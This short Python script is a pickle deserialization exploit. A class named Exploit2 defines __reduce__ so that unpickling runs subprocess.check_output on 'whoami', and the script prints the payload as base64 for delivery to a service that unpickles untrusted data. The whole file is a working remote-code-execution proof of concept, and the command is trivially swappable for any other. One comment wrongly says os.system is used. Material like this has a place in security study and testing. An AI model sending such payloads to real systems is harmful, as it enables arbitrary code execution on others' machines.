import base64
import pickle
import os
import subprocess


class Exploit2:
    def __reduce__(self):
        cmd = ("whoami",)  # Command as a tuple
        return subprocess.check_output, cmd  # Using os.system for RCE


payload = pickle.dumps(Exploit2())

if __name__ == "__main__":
    pickled = pickle.dumps(Exploit2())  # Removed the extra quotes
    print(base64.urlsafe_b64encode(pickled).decode())  # Decoding for readable output
